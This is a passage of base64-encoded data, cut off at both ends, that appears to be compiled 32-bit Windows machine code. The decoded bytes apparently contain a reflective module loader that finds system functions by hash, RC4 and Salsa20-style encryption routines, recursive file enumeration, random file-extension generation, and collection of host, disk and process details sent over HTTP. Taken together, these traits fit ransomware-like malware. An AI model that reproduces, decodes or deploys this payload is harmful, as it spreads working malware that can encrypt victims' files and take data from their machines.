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QiV0IiU38/xXMMAEQhcAPhMcAAACDffwAD4WYAAAAM8CNTiSJRfRR/3SFuP8VoDABEIXAdBGLRfSNTiRAiUX0g/gOcuLrUzPAOUUIjVgBjUYkUP83dQj/FZgxARDrBv8VnDEBEGgohgEQ/zf/FZwxARD/RQiNRiRQ/xXMMQEQi034agGNDEGLRfyB+cADAACJTfhZD0fBiUX8Vv918P8V0DABEIXAdA//FaQxARCD+BIPhV7///+F23QZiwczyWY5CHQQUP8VzDEBEIsPM9JmiVRB/otFDItN+IkIaACAAAAzwFBWizXEMQEQ/9b/dfD/FdAxARCF23UMaACAAAAzwFD/N//Wi8NfXluL5V3CCABTVovxM9tXiz3EMQEQOR50C2gAgAAAU/92CP/XOV4MdAtoAIAAAFP/dhT/1zleGHQLaACAAABT/3Yg/9c5XjB0C2gAgAAAU/92OP/XOV48dAtoAIAAAFP/dkT/1zleSHQLaACAAABT/3ZQ/9c5XlR0C2gAgAAAU/92XP/XOV4kdAtoAIAAAFP/diz/1zleYHQLaACAAABT/3Zo/9c5noAAAAB0DmgAgAAAU/+2hAAAAP/XX15bw1WL7IHsjAAAAFNWV2pNWGpvZomFdP///4vxWGp6ZomFdv///1hqaVpqbGaJhXj///9YamFmiYV8////ZomFfv///1hqL2aJRYBYajVmiUWCWGouW2owZolFhFhqIFlqKGaJRYhYaldfam5miUWMWGpkZolFklhqb2aJRZRYandmiUWWWGpzZolFmFhqTmaJRZpYalRmiZV6////ZolVkFpqNmaJTYpmiU2cZolNollqMWaJRZ5YajtmiV2GZoldpltqIGaJRahYZol9jmaJVaBmiU2kZoldqmaJRaxqT1hqNGaJRbBYaiBmiUW2WGpyZolFumaJTbRZamlYamRmiUXAWGplZolFwmaJVbxaam5YanRmiUXGWGovZolFyFhqN2aJRcpYai5miUXMWGowZol9rmaJfbJfaiBmiUXOZolduGaJXdJbanZYajpmiUXYWGoxZolF2lhqLmaJRdxmiUXeWGopZolF4FhqbGaJReRYamlmiUXoWGprZolNvmaJTdZZakdmiUXqWGaJVcRmiX3QZold1GaJfeJmiV3mZolN7GaJVe5miV3wZolF8os9kDIBEDPbamNYam9miUX2WFNTZolF+jPAU2aJRfyNhXT///9qAVBmiVX0ZolN+P/XiUYEhcB1FWgAAAAQU1NqAY2FdP///1D/14lGBF9eW4vlXcNVi+yD7BRTix2gMgEQVovxV4N+BAB0Bf92BP/Ti87o2/3//zP/V1dqA1dX/3U0/3UI/3YE/xWkMgEQiUUIhcAPhJAAAABoACgAAI1N8Oh/0v//aAAIAACNTfDot9L///91DIvwaNR1ARBW/xVwMgEQg8QMuAD3hISBfTS7AQAAuQD3BIQPRMhXUVdXaPB9ARBWi3UIaFR+ARBW/xWUMgEQiUU0hcB0Hv91FP91EP91MP91LFD/FZgyARAzyUGFwItFNA9F+VD/01b/041N8Ogy0v//i8dfXluL5V3CMABVi+xRU1ZXi/lX/xXMMQEQi9gzwFBQUFBTV1Bo6f0AAP8V8DABEIXAfjyNBEUCAAAAi8iJRfzorwEAAIvwM8CF9nQlUFD/dfxWU1dQaOn9AAD/FfAwARCFwH4Ei8brCYvO6JUBAAAzwF9eW4vlXcNVi+xRVleLPdwSAhBX/xXMMQEQjQxFAgAAAOhcAQAAi/CF9nQ0V1b/FZgxARAz/4vOZjk+dCEPtxGNQp9mg/gZdwiNQuAPt8DrAovCZokBg8ECZjk5dd+Lxl9ei+Vdw1WL7FFRU4vaM8BWi/FmOQN1B4vG6YUAAAAPtwZXZoXAdHmL/sdF/BkAAAAr+4vTZoXAdFIPtwJmhcB0aA+3DBeNQZ9mO0X8dwiNQeAPt8DrAovBD7cKiUX4jUGfZjtF/HcIjUHgD7fA6wKLwYtN+A+3wA+3ySvIdQ2DwgIzwGY5BBd1sOsCM8BmOQJ0F4PGAoPHAg+3BmaFwHWSM8BfXluL5V3Di8br9VOL2jPAVovxZjkDdQSLxutJD7cGV2aFwHQ9i/4r+4vTZoXAdB0PtwJmhcB0MA+3DBcryHUNg8ICM8BmOQQXdeXrAjPAZjkCdBSDxgKDxwIPtwZmhcB1xzPAX15bw4vG6/iF0nQMUmoAUehyMgAAg8QMM8DDagRoADAAAFFqAP8VZDEBEMNoAIAAAGoAUf8VxDEBEMPrAUGAOQB1+ogRw1WL7IPsdKHkEgIQU1ZXaAAAAPBqATPbiUX4U1ONRfyL+lD/FSwwARCFwA+E7QAAAGoaWjPJiVX0jUFhZolETYxBO8py8400P41GAVCNTcTois///1aNTcToxs///4vwhfZ1GVD/dfz/FSQwARCNTcTonc///zPA6aMAAACNReTHRdRDcnlwUMdF2HRHZW7HRdxSYW5kZsdF4G9tiF3ix0XkQWR2YcdF6HBpMzLHRewuZGxsiF3w/xUoMQEQhcB1Do1F5FD/FSAxARCFwHQ8jU3UUVD/FaAxARCFwHQtVlf/dfz/0IXAdCIzyYX/dBmLXfgPtgQxmfd99GaLRFWMZokES0E7z3LqM9tDagD/dfz/FSQwARCNTcTo9c7//4vDX15bi+Vdw1WL7IPsKFNoAAAA8GoBM9uNRfxTU1CJXfj/FSwwARCFwHR2jUXox0XYQ3J5cFD